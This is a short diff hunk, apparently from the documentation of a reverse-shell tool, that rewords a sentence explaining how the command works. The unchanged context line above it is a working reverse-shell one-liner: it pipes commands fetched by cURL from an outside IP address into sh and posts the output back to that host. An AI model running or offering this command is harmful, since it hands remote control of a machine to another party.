@@ -60,5 +60,5 @@ exec curl -X POST -sN http://217.138.219.220:30903/input \
     | sh 2>&1 | curl -s -T - http://217.138.219.220:30903/stdout
 ```
 
-The target's shell then starts 2 cURL processes to connect the another shell's input and output to cURL. HTTP's 'chunked transfer' (`-T`) does the rest.
+This command starts two cURL processes and connects another shell's input and output these two cURL. HTTP's 'chunked transfer' (`-T`) does the rest.
 
